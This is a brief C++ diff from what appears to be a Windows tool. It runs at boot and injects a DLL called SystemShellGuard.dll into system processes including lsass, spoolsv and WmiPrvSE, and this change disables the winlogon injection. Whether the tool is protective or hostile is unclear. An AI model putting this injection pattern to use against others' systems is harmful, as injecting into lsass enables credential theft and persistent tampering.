@@ -123,7 +123,7 @@ int main (){//和那个Service一样都是开机启动的  完全R3
 	
 	
 	inject(getSinglePid("OfficeClickToRun"),"c:\\windows\\system32\\SystemShellGuard.dll");
-	inject(getSinglePid("winlogon"),"c:\\windows\\system32\\SystemShellGuard.dll");
+	//inject(getSinglePid("winlogon"),"c:\\windows\\system32\\SystemShellGuard.dll");
 	inject(getSinglePid("spoolsv"),"c:\\windows\\system32\\SystemShellGuard.dll");
 	inject(getSinglePid("WmiPrvSE"),"c:\\windows\\system32\\SystemShellGuard.dll");
 	inject(getSinglePid("lsass"),"c:\\windows\\system32\\SystemShellGuard.dll");
